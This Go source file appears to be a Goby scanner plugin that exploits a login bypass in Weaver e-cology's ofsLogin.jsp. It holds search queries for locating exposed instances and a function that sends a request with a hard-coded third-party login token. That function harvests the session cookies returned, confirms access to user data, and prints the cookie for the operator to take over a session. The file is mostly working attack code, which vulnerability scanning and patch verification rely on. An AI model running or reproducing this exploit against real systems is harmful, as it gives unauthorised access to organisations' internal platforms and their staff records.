package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver e-cology ofsLogin.jsp User Login Bypass Vulnerability",
    "Description": "<p>The Weaver management application platform (e-cology) is a comprehensive enterprise management platform. It has diversified functions, including enterprise information portal, knowledge document management, work process management, human resource management, customer relationship management, project management, financial management, asset management, supply chain management and data center. This platform helps enterprises integrate various resources, including management, marketing, sales, research and development, personnel, and administrative fields. Through e-cology, these resources can be integrated on a unified platform and provide users with a unified interface for easy operation and information retrieval .</p><p>The Weaver management application platform (e-cology) has a privilege bypass vulnerability, which allows attackers to bypass system privileges and log in to the system to perform malicious operations</p>",
    "Product": "Weaver-OA",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2023-05-15",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "body=\"/wui/common/\"||body=\"/wui/index.html\"",
    "GobyQuery": "body=\"/wui/common/\"||body=\"/wui/index.html\"",
    "Level": "3",
    "Impact": "<p>The Weaver management application platform (e-cology) has a privilege bypass vulnerability, which allows attackers to bypass system privileges and log in to the system to perform malicious operations</p>",
    "Recommendation": "<p>The official security update patch has been released: <a href=\"https://www.weaver.com.cn/cs/securityDownload.html?src=cn\">https://www.weaver.com.cn/cs/securityDownload.html?src=cn</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.3",
    "Translation": {
        "CN": {
            "Name": "Weaver e-cology ofsLogin.jsp 用户登陆绕过漏洞",
            "Product": "泛微-协同办公OA",
            "Description": "<p>泛微协同管理应用平台（e-cology）是一款全面的企业管理平台。它具备多元化的功能，包括企业信息门户、知识文档管理、工作流程管理、人力资源管理、客户关系管理、项目管理、财务管理、资产管理、供应链管理以及数据中心等。这款平台有助于企业整合各种资源，包括管理、市场、销售、研发、人事和行政等各个领域。通过e-cology，这些资源可以在一个统一的平台上集成，并为用户提供统一的界面以方便操作和获取信息。</p><p>泛微协同管理应用平台（e-cology）存在权限绕过漏洞，攻击者可以绕过系统权限，登录系统执行恶意操作。</p>",
            "Recommendation": "<p>官方已发布安全更新补丁：<a href=\"https://www.weaver.com.cn/cs/securityDownload.html?src=cn\" target=\"_blank\">https://www.weaver.com.cn/cs/securityDownload.html?src=cn</a></p>",
            "Impact": "<p>泛微协同管理应用平台（e-cology）存在权限绕过漏洞，攻击者可以绕过系统权限，登录系统执行恶意操作。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Weaver e-cology ofsLogin.jsp User Login Bypass Vulnerability",
            "Product": "Weaver-OA",
            "Description": "<p>The Weaver management application platform (e-cology) is a comprehensive enterprise management platform. It has diversified functions, including enterprise information portal, knowledge document management, work process management, human resource management, customer relationship management, project management, financial management, asset management, supply chain management and data center. This platform helps enterprises integrate various resources, including management, marketing, sales, research and development, personnel, and administrative fields. Through e-cology, these resources can be integrated on a unified platform and provide users with a unified interface for easy operation and information retrieval&nbsp;.</p><p>The Weaver management application platform (e-cology) has a privilege bypass vulnerability, which allows attackers to bypass system privileges and log in to the system to perform malicious operations</p>",
            "Recommendation": "<p>The official security update patch has been released: <a href=\"https://www.weaver.com.cn/cs/securityDownload.html?src=cn\" target=\"_blank\">https://www.weaver.com.cn/cs/securityDownload.html?src=cn</a></p>",
            "Impact": "<p>The Weaver management application platform (e-cology) has a privilege bypass vulnerability, which allows attackers to bypass system privileges and log in to the system to perform malicious operations</p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10779"
}`

	sendPayloadFlagfSsDKM := func(u *httpclient.FixUrl) (string, error) {
		uri := "/mobile/plugin/1/ofsLogin.jsp?syscode=1&timestamp=1&gopage=/wui/index.html&receiver=1&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168"
		resp, err := httpclient.SimpleGet(u.FixedHostInfo + uri)
		if err != nil {
			return "", err
		}
		if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "location.replace('/wui/index.html');") {
			cookie := ""
			for i := 0; i < len(resp.HeaderString.Lines); i++ {
				if strings.Contains(resp.HeaderString.Lines[i], "Set-Cookie:") {
					cookie += strings.ReplaceAll(resp.HeaderString.Lines[i], "Set-Cookie: ", "")
				}
			}
			cookie = strings.ReplaceAll(cookie, " path=/", "")
			cookie += " path=/"
			cfg := httpclient.NewGetRequestConfig("/api/ecode/sync")
			cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
			cfg.Header.Store("Accept-Encoding", "gzip, deflate")
			cfg.Header.Store("Accept-Language", "zh-CN,zh;q=0.9")
			cfg.Header.Store("User-Agent", "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0")
			cfg.Header.Store("Cookie", cookie)
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("Referer", u.FixedHostInfo+"/mobile/plugin/1/ofsLogin.jsp?syscode=1&timestamp=1&gopage=/wui/index.html&receiver=1&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168")
			resp, err = httpclient.DoHttpRequest(u, cfg)
			if err != nil {
				return "", errors.New("漏洞不存在")
			}
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"_user\":") && strings.Contains(resp.Utf8Html, "departmentName") && strings.Contains(resp.Utf8Html, "subCompanyId") {
				return cookie, nil
			}
		}
		return "", errors.New("漏洞不存在")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			cookie, err := sendPayloadFlagfSsDKM(hostinfo)
			if err != nil || cookie == "" {
				return false
			}
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cookie, err := sendPayloadFlagfSsDKM(expResult.HostInfo)
			if err != nil || cookie == "" {
				return expResult
			} else {
				expResult.Output = "登陆地址：" + expResult.HostInfo.FixedHostInfo + "/wui/index.html?#/main\n请在浏览器中替换登陆Cookie: " + cookie
				expResult.Success = true
			}
			return expResult
		},
	))
}
